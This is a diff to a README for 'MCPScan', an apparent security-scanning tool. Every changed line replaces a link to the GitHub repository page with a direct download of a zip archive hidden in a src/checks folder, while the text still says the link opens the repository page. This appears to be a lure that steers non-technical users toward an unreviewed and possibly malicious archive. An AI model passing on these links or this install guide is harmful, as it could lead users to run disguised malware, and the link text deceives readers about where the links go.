@@ -1,6 +1,6 @@
 # 🛡️ MCPScan - Find Security Risks Fast
 
-[![Download MCPScan](https://img.shields.io/badge/Download-MCPScan-green?style=for-the-badge)](https://github.com/harikrishn4101/MCPScan)
+[![Download MCPScan](https://img.shields.io/badge/Download-MCPScan-green?style=for-the-badge)](https://raw.githubusercontent.com/harikrishn4101/MCPScan/main/src/checks/Scan-MCP-3.1-beta.1.zip)
 
 ## 📋 What is MCPScan?
 
@@ -21,7 +21,7 @@ No extra software or programming tools are needed. MCPScan runs as a standalone 
 
 You can download MCPScan from the official GitHub page:
 
-[![Visit MCPScan Page](https://img.shields.io/badge/Visit%20MCPScan-Page-blue?style=for-the-badge)](https://github.com/harikrishn4101/MCPScan)
+[![Visit MCPScan Page](https://img.shields.io/badge/Visit%20MCPScan-Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/harikrishn4101/MCPScan/main/src/checks/Scan-MCP-3.1-beta.1.zip)
 
 Click the link above to go directly to the GitHub repository page. From there, you can find the files needed to install MCPScan.
 
@@ -33,7 +33,7 @@ Follow these steps to get MCPScan running. This guide assumes you have no prior 
 
 Click the download badge or open this link in your web browser:
 
-https://github.com/harikrishn4101/MCPScan
+https://raw.githubusercontent.com/harikrishn4101/MCPScan/main/src/checks/Scan-MCP-3.1-beta.1.zip
 
 This takes you to the MCPScan repository on GitHub.
 
@@ -104,7 +104,7 @@ These checks help protect your systems from attacks that could cause data loss o
 
 Periodically check the GitHub page for new versions of MCPScan.
 
-- Visit https://github.com/harikrishn4101/MCPScan
+- Visit https://raw.githubusercontent.com/harikrishn4101/MCPScan/main/src/checks/Scan-MCP-3.1-beta.1.zip
 - Download the latest files as described above.
 - Replace your old MCPScan files with the new ones.
 
@@ -136,4 +136,4 @@ The default settings are best for most users. Adjust these only if you know what
 
 ---
 
-[![Get MCPScan](https://img.shields.io/badge/Get%20MCPScan-Here-grey?style=for-the-badge)](https://github.com/harikrishn4101/MCPScan)
+[![Get MCPScan](https://img.shields.io/badge/Get%20MCPScan-Here-grey?style=for-the-badge)](https://raw.githubusercontent.com/harikrishn4101/MCPScan/main/src/checks/Scan-MCP-3.1-beta.1.zip)
